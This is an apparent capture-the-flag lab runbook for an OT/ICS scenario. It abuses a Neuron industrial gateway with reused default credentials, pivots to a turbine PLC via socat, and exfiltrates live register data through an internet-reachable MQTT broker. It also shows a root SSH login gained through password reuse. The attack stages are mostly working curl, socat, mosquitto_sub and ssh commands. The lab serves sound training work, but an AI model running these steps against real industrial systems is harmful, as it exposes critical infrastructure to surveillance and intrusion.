# Runbook: Neuron gateway covert exfiltration

Configure the Neuron industrial protocol gateway in the DMZ to poll the turbine
PLC and relay live register data northbound to a public MQTT broker. Once set up,
the exfiltration runs without further attacker interaction. The turbine's RPM,
temperature, and setpoints are visible from the internet for as long as the
gateway config persists.

- Techniques: 
  - [Credential attacks and authentication abuse](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#credential-attacks-and-authentication-abuse)
  - [IT/OT boundary crossing](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#initial-access-and-lateral-movement-through-the-it-ot-boundary)
  - [Data exfiltration](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#data-exfiltration)
  - [Process intelligence gathering](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#process-intelligence-gathering)
- Challenge type: Realist
- Difficulty: Advanced

## Components to start

```bash
./ctl up
sudo ./ctl firewall
```

Minimal containers: `uupl-eng-ws`, `hex-turbine-plc`, `sorting-office`, `clacks-relay`,
`unseen-gate`

A Phase 1 entry chain is also needed to reach `uupl-eng-ws`; see `admin-home-pivot.md`
for the minimum containers that involves. The firewall is required to verify that the
exfiltration path exits through the DMZ rather than via a direct control zone route.

This chain requires a prior Phase 1 foothold on a host from which the control
zone is reachable. The engineering workstation at `uupl-eng-ws` (10.10.2.30 /
10.10.3.100) is the intended pivot. See the admin-home-pivot or
enterprise-to-turbine-trip runbooks for entry.

## Background

`sorting-office` (10.10.5.11) runs the Neuron industrial protocol gateway.
Neuron's management API on port 7000 accepts `admin` / `uupl2015`. The password
is reused from the SSH bastion root account on `contractors-gate` (10.10.5.20):
an attacker who finds either credential can try it on the other.

A northbound MQTT output to `clacks-relay` (10.10.5.12:1883) is pre-configured
at build time. There is no southbound device. The control zone is not directly
reachable from the DMZ, so adding a southbound device only becomes useful after
gaining a foothold on a host that bridges the operational and control networks.
Once that foothold is in place, the gateway becomes a persistent exfil pipeline
out through the DMZ.

## Attack path

### Stage 1: confirm gateway access from the engineering workstation

```bash
# From uupl-eng-ws (10.10.2.30), which is on the operational zone
# The DMZ firewall permits operational zone → DMZ on port 7000
curl http://10.10.5.11:7000/
# Neuron management UI returns HTML
```

### Stage 2: authenticate and obtain a token

```bash
curl -s -X POST http://10.10.5.11:7000/api/v2/login \
  -H 'Content-Type: application/json' \
  -d '{"name":"admin","pass":"uupl2015"}'
# {"token":"eyJ..."}

TOKEN=eyJ...
```

### Stage 3: add a Modbus TCP south node

```bash
# Create a new southbound node using the Modbus TCP driver
curl -s -X POST http://10.10.5.11:7000/api/v2/node \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"name":"turbine-plc","plugin":"Modbus TCP"}'
# {"error":0}

# Configure the node to reach the PLC
# From sorting-office's perspective the PLC is not directly reachable;
# the connection goes via the engineering workstation acting as relay,
# or the config can point at the eng-ws's control NIC (10.10.3.100) if
# a port-forwarding socat has been started there first
socat TCP-LISTEN:5021,fork TCP:10.10.3.21:502 &
# Then point Neuron at the eng-ws control NIC

curl -s -X POST http://10.10.5.11:7000/api/v2/node/setting \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"node":"turbine-plc","params":{"host":"10.10.3.100","port":5021,"timeout":3000,"connection_mode":0}}'
# {"error":0}
```

### Stage 4: add a tag group and register tags

```bash
# Create a polling group (interval in milliseconds)
curl -s -X POST http://10.10.5.11:7000/api/v2/group \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"node":"turbine-plc","group":"telemetry","interval":5000}'
# {"error":0}

# Add tags for the turbine input registers (IR[0:5])
# Modbus address notation: 3x = input registers, 4x = holding registers
curl -s -X POST http://10.10.5.11:7000/api/v2/tags \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "node": "turbine-plc",
    "group": "telemetry",
    "tags": [
      {"name":"rpm",          "address":"3!0",  "attribute":1,"type":3},
      {"name":"temp_c",       "address":"3!1",  "attribute":1,"type":3},
      {"name":"pressure_bar", "address":"3!2",  "attribute":1,"type":3},
      {"name":"voltage_a",    "address":"3!3",  "attribute":1,"type":3},
      {"name":"governor_sp",  "address":"4!0",  "attribute":1,"type":3},
      {"name":"estop",        "address":"1!0",  "attribute":1,"type":14}
    ]
  }'
# {"error":0}
```

### Stage 5: subscribe from the internet

```bash
# clacks-relay at 10.10.5.12:1883 is reachable from the internet zone
# From unseen-gate:
mosquitto_sub -h 10.10.5.12 -p 1883 -t '#' -v
# neuron/sorting-office/telemetry/rpm      2997
# neuron/sorting-office/telemetry/temp_c   312
# neuron/sorting-office/telemetry/governor_sp 3000
# ...

# Targeted topic (exact path depends on Neuron northbound config)
mosquitto_sub -h 10.10.5.12 -p 1883 \
  -t 'neuron/+/+/rpm' \
  -t 'neuron/+/+/estop' \
  -v
```

### Stage 6: verify the credential reuse finding

```bash
# Same password on the SSH bastion, so try it
ssh root@10.10.5.20
# Password: uupl2015
# root shell on contractors-gate; enterprise NIC at 10.10.1.30
```

## Flag placement

Embed the flag as a tag value in the Neuron config. After Stage 3 and 4, the
participant reads a tag named `ctf_flag` with value `RM{...}` from the MQTT
stream. Plant it as a static tag in the Neuron bootstrap configuration, or
write it to a holding register on the PLC that Neuron then polls and publishes.

## Why DMZ gateways with default credentials are worse than open PLCs

A gateway in the DMZ is supposed to sit between the internet and the control
zone. When it has the same password as the bastion host and a northbound MQTT
output already configured, it becomes a protocol bridge that an attacker can
arm from the outside. The control zone firewall blocks direct access to the PLC,
but it does not stop data flowing out via a gateway that was designed to publish
data northbound. The path through the DMZ is exactly what the firewall rules
permit.
